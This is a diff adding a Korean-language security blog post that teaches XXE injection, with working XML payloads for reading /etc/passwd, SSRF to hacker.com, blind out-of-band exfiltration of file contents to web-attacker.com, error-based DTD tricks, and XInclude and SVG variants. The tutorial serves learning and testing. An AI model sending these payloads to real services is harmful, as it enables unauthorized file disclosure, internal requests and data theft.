@@ -1,0 +1,161 @@
+---
+title: XXE
+desc: What is XXE?
+date: 2024-11-09
+thumbnail: /posts/basic_skill/xxe/thumbnail.png
+---
+## What's XXE Injection?
+
+![](/posts/basic_skill/xxe/0.png)
+
+XXE 취약점은 XML을 사용하는 서비스에서 발생할 수 있는 취약점입니다.
+XXE 공격이 이루어지는 방식은 XML을 Parsing해서 사용하는 서비스에 악의적인 XML 구문을 입력하여 공격자가 원하는 동작을 수행 시키는 방입니다. 
+따라서 XML Parser가 존재하는 곳부터 영향력이 발생하게 되어 SSRF, RCE 등이 발생할 수 있으므로 위험한 취약점이라고 볼 수 있습니다.
+
+---
+## Background
+
+### XML?
+
+XML은 Extensible Markup Language의 약자입니다. 한마디로 다목적 마크업 언어이다.
+XML은 인터넷이 연결된 서비스끼리 데이터를 용이하게 전달하기 위해 개발되었다.
+XML은 웹사이트, 데이터베이스, SOAP 통신 프로토콜 등 많은 곳에서 사용된다.
+
+XML의 자세한 정보
+https://bobong.blog/post/Development/XML
+
+---
+## Basic Attack
+
+### Exploiting XXE to retrieve files
+
+XXE 취약점을 이용해서 서버에 존재하는 파일을 읽을 수 있습니다.
+
+XML을 제출하여 유저의 이름으로 정보를 조회할 수 있는 상황을 가정해 봅시다.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<USER><name>bobong</name></USER>
+```
+
+/etc/passwd 파일을 외부 ENTITY에 정의하고 해당 ENTITY를 name 값에 사용합니다.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<USER><name>&xxe;</name></USER>
+```
+
+서비스에 별다른 방어 수단이 존재하지 않는다면 아래와 같이 응답을 통해 /etc/passwd 값이 포함 될 수 있습니다.
+
+```text
+User Name : root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+### Exploiting XXE to perform SSRF attacks
+
+XML의 ENTITY에서 URL를 통한 참조가 가능하기 때문에 SSRF가 발생할 수 있습니다.
+
+아래와 같은 코드가 XML Parser를 통해 읽어지게 되면 내부 서버에서 직접 http요청을 하기 때문에 SSRF 취약점이 발생할 수 있습니다.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://hacker.com/"> ]>
+<USER><name>&xxe;</name></USER>
+```
+
+### Blind XXE
+
+Blind XXE는 에플리케이션에서 XXE 취약점이 존재하지만 외부 ENTITY값을 반환하지 않는 경우에 발생합니다.  2가지 방법을 통해 Blind XXE 취약점을 공격할 수 있습니다.
+
+**OAST & OOB**
+
+Out of Band는 외부 채널을 이용하여 XXE 구문을 보내는 기법입니다.
+
+아래 Interactsh는 무료로 OOB를 지원해줍니다.
+https://app.interactsh.com/#/
+
+아래는 기본적으로 OOB를 이용한 Blind XXE Injection을 하는 방법입니다.
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+**Error-Basd XXE**
+
+ENTITY 선언 과정 중 오류를 임의로 발생 시키는데, 발생 시키는 에러에 원하는 정보를 담아 읽는 방법 입니다. Error-Base XXE는 크게 두 가지 방법이 있습니다. 해당 방법들은 XML을 파싱하는 부분에서 에러 메세지를 보여주는지 확인 후 진행하면 좋습니다.
+
+첫번째 방법은 `malicious.dtd` 파일을 작성하고 OOB 방식을 통해 DTD 파일을 참조 시켜 정보가 담긴 에러 메세지를 받는 방법입니다.
+
+malicious.dtd
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+payload
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
+
+두번째 방법으로는 OOB 방식이 막혀 사용할 수 없을 때 사용할 수 있습니다. XML Parser가 작동되는 시스템 내부에 존재하는 다른 DTD 파일을 참조해서 XXE 취약점을 발생시킵니다. 
+예를 들어 `/usr/local/app/hi.dtd`가 존재하고, 해당 DTD 파일에는 `hello`라는 ENTITY가 선언되어 있다고 볼 때 `hello` ENTITY에 에러 발생 구문을 재선언하여 Exploit 할 수 있습니다.
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/hi.dtd">
+<!ENTITY % hello '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+시스템 내부에 존재하는 DTD 파일을 탐지하는 방법은 존재할 수도 있는 DTD 파일 리스트를 가지고  Brute-force를 통해 확인할 수 있습니다.
+
+DTD List
+https://github.com/GoSecure/dtd-finder/tree/master/list
+
+### XInclude XXE
+
+XInclude는 XML 문서에서 다른 XML 문서나 일반 텍스트 파일을 포함할 수 있는 메커니즘을 제공하는 XML 확장입니다. 이를 통해 하나의 XML 문서에서 다른 XML 문서의 일부를 가져와 재사용할 수 있습니다.
+
+XInclude XXE Payload
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+### SVG XXE
+
+SVG는 XML 포맷을 이용하여 구성되어있습니다. 따라서 SVG를 업로드 시킬 수 있는 곳이 있다면 XXE 취약점이 존재할 수 있습니다.
+
+SVG XXE Payload
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+		<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+			<text font-size="16" x="0" y="16">&xxe;</text>
+		</svg>
+```
+---
+## Reference
+https://www.hahwul.com/cullinan/xxe/
+https://portswigger.net/web-security/xxe
+https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md
+https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+
+---
+## Lab
+https://gosecure.github.io/xxe-workshop/#0
